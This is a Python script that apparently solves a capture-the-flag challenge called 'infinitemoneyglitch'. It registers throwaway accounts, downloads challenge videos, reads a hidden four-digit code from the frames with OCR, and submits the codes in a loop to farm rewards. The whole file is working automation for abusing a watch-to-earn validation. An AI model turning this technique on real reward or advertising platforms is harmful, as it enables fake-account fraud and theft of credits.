import threading
import requests
import uuid
import cv2
import time
from PIL import Image
import pytesseract
import os
import sys
def get_cookies():
    my_uuid = uuid.uuid4()
    u="cctvvmb"+str(my_uuid)[:4]
    data = {
        "email": f"{u}@gmail.com",
        "username": u,
        "firstname": u,
        "lastname": u,
        "password": u,
        "confirm_password": u,
        "submit": "Sign In",
    }
    jar = requests.cookies.RequestsCookieJar()
    r = requests.post(url=URL+"/signup", data=data, cookies=jar)
    for historicResponse in r.history:
        jar.update(historicResponse.cookies)
    return jar

def find_line_with_text(text, match):
    for line in text.splitlines():
        if 0<=line.find(match):
            return line
    return None

URL="http://infinitemoneyglitch.chall.malicecyber.com"

if len(sys.argv) > 1:
    jar = requests.cookies.RequestsCookieJar()
    my_cookie = requests.cookies.create_cookie(name="token", value=sys.argv[1], domain="infinitemoneyglitch.chall.malicecyber.com")
    jar.set_cookie(my_cookie)
else:
    jar = get_cookies()
print(jar)

to_validate=[]

while True:

    r=requests.get(url=URL+"/video", cookies=jar)
    print(r.status_code)
    video_uuid = find_line_with_text(r.text, "<source src=")[29:65]
    print(f"video_uuid:{video_uuid}")

    # DL
    r=requests.get(url=URL+"/stream/"+video_uuid, cookies=jar)
    video_data = r.content
    filename = video_uuid + ".mp4"
    with open(filename, 'wb') as f:
        f.write(r.content)
    print("DL ok")

    # capture
    cap = cv2.VideoCapture(filename)
    temps_precedent = 0
    cpt = 0
    code = "0000"
    while True:
        cpt+=1
        ret, frame = cap.read()
        if not ret:
            break
        if cpt % (24 * 3) != 0:
            continue
        output_image_file = f"{video_uuid}_{cpt}.png"
        cv2.imwrite(output_image_file, frame)
        image = Image.open(output_image_file)
        texte_ocr = pytesseract.image_to_string(image)
        os.remove(output_image_file)
        marker = "code: "
        index = texte_ocr.find(marker)
        if index >= 0:
            index += len(marker)
            code = texte_ocr[index:index+4]
            break
    cap.release()
    os.remove(filename)

    now = time.time()
    if code != "0000":
        to_validate.append((now, video_uuid, code))
        print((now, video_uuid, code))

    validated = []
    for vv in to_validate:
        (ts, video_uuid, code) = vv
        if ts + 30 < now:
            json={"uuid": video_uuid, "code": code}
            r=requests.post(url=URL+"/validate", json=json, cookies=jar)
            print(r.text)
            validated.append(vv)
    for vv in validated:
        to_validate.remove(vv)

    print("-----------------------------------------------")